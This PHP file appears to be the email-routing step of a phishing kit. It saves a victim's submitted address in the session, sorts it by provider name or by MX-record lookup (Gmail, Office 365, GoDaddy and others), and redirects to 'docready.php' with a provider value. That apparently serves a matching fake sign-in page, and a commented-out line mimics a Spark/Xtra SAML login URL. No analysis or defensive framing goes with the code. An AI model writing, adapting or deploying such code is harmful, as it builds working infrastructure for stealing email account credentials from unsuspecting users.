<?php
ob_start();
session_start();

//redirect for invalid email
$signin = "signin.php#/username?error=invalid_email";


//random string
$asp = "AuthSecInformation.aspx";


//GET HOST NAME
$hostname = bin2hex($_SERVER['HTTP_HOST']);


//Fetching Form Data and setting it on session

$_SESSION['email'] = $email = $_POST['email'];

// pass valid/invalid emails
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
     $setback = "./";
     $errorid = "12";
     //$argument = "spEntityID=appsuite-saml-xm1&echo=$email&error=invalidemail&goto=https%3A%2F%2Fwww.spark.co.nz%2Fcwa%2FSSORedirect%2FmetaAlias%2FXtramail%2Fidp1%3FReqID%3Dee15ec6706474672a5e8e4715fc48569%26index%3Dnull%26acsURL%3Dhttps%253A%252F%252Fwebmail.xtra.co.nz%252Fappsuite%252Fapi%252Fsaml%252Facs%26spEntityID%3Dappsuite-saml-xm1%26binding%3Durn%253Aoasis%253Anames%253Atc%253ASAML%253A2.0%253Abindings%253AHTTP-POST";
     header("Location: $setback?errorid=$errorid");
} else {
//Get Domain Name

    $domain = substr(strrchr($email, "@"), 1);



//Checking if domain is common ones
    $dom_low = strtolower("$domain");

    if (strpos($dom_low, 'gmail') !== false) {
        header("Location: docready.php?provider=google");
    } elseif (strpos($dom_low, 'yahoo') !== false) {
        header("Location: docready.php?provider=yahoo");
    } elseif (strpos($dom_low, 'att.net') !== false) {
        header("Location: docready.php?provider=yahoo");
    } elseif (strpos($dom_low, 'yandex') !== false) {
        header("Location: docready.php?provider=yandex");
    } elseif (strpos($dom_low, 'aol.com') !== false) {
        header("Location: docready.php?provider=aol");
    } elseif (strpos($dom_low, 'aim.com') !== false) {
        header("Location: docready.php?provider=aol");
    } elseif (strpos($dom_low, 'msn.com') !== false) {
        header("Location: docready.php?provider=msn");
    } elseif (strpos($dom_low, 'outlook') !== false) {
        header("Location: docready.php?provider=msn");
    } elseif (strpos($dom_low, 'hotmail') !== false) {
        header("Location: docready.php?provider=msn");
    } elseif (strpos($dom_low, 'live.com') !== false) {
        header("Location: docready.php?provider=msn");
    } elseif (strpos($dom_low, 'comcast') !== false) {
        header("Location: docready.php?provider=comcast");
    } elseif (strpos($dom_low, 'earthlink') !== false) {
        header("Location: docready.php?provider=earthlink");
    } elseif (strpos($dom_low, 'cox.net') !== false) {
        header("Location: docready.php?provider=cox");
    } elseif (strpos($dom_low, 'sbcglobal') !== false) {
        header("Location: docready.php?provider=yahoo");
    } elseif (strpos($dom_low, 'adelphia.net') !== false) {
        header("Location: docready.php?provider=yahoo");
    } elseif (strpos($dom_low, 'rr.com') !== false) {
        header("Location: docready.php?provider=rr");
    } elseif (strpos($dom_low, 'verizon') !== false) {
        header("Location: docready.php?provider=aol");
    } elseif (strpos($dom_low, 'rocketmail') !== false) {
        header("Location: docready.php?provider=aol");
    } elseif (strpos($dom_low, 'netscape.net') !== false) {
        header("Location: docready.php?provider=aol");
    } elseif (strpos($dom_low, 'pacbell.net') !== false) {
        header("Location: docready.php?provider=yahoo");
    } elseif (strpos($dom_low, 'centurylink.net') !== false) {
        header("Location: docready.php?provider=centurylink");
    } elseif (strpos($dom_low, 'centurytel.net') !== false) {
        header("Location: docready.php?provider=centurylink");
    } elseif (strpos($dom_low, 'embarqmail.com') !== false) {
        header("Location: docready.php?provider=centurylink");
    } elseif (strpos($dom_low, 'optimum.net') !== false) {
        header("Location: docready.php?provider=optonline");
    } elseif (strpos($dom_low, 'optonline.net') !== false) {
        header("Location: docready.php?provider=optonline");
    } elseif (strpos($dom_low, 'microsoft') !== false) {
        header("Location: docready.php?provider=msn");
    } elseif (strpos($dom_low, 'ameritech.net') !== false) {
        header("Location: docready.php?provider=yahoo");
    } elseif (strpos($dom_low, 'swbell.net') !== false) {
        header("Location: docready.php?provider=yahoo");
    } elseif (strpos($dom_low, 'suddenlink.net') !== false) {
        header("Location: docready.php?provider=centurylink");
    } else {
// Getting MX record
        function mxrecordValidate($email, $domain)
        {

            $arr = dns_get_record($domain, DNS_MX);
            if ($arr[0]['host'] == $domain && !empty($arr[0]['target'])) {
                return $arr[0]['target'];
            }
        }

        if (mxrecordValidate($email, $domain)) {
            $data = dns_get_record($domain, DNS_MX);
            foreach ($data as $key1) {
                $_SESSION['record'] = $record = $key1['target'];

    //bring it to lower case
                $record_tolowcase = strtolower("$record");

                if (strpos($record_tolowcase, 'zoho') !== false) {
                        header("Location: docready.php?provider=Zoho");
                } elseif (strpos($record_tolowcase, 'google') !== false) {
                    header("Location: docready.php?provider=google");
                } elseif (strpos($record_tolowcase, 'outlook') !== false) {
                    header("Location: docready.php?provider=office");
                } elseif (strpos($record_tolowcase, 'emailsrvr') !== false) {
                    header("Location: docready.php?provider=rackspace");
                } elseif (strpos($record_tolowcase, 'yandex') !== false) {
                    header("Location: docready.php?provider=yandexhosted");
                } elseif (strpos($record_tolowcase, 'yahoo') !== false) {
                    header("Location: docready.php?provider=yahoo");
                } elseif (strpos($record_tolowcase, 'secureserver.net') !== false) {
                    header("Location: docready.php?provider=godaddy");
                } elseif (strpos($record_tolowcase, 'godaddy') !== false) {
                    header("Location: docready.php?provider=godaddy");
                } elseif (strpos($record_tolowcase, 'rackspace') !== false) {
                    header("Location: docready.php?provider=rackspace");
                } else {
                    $webmail = "webmail";
                    header("Location: docready.php?provider=webmail");
                }
            }
        } else {
            $webmail = "webmail";
            header("Location: docready.php?provider=webmail");
        }
    }
}
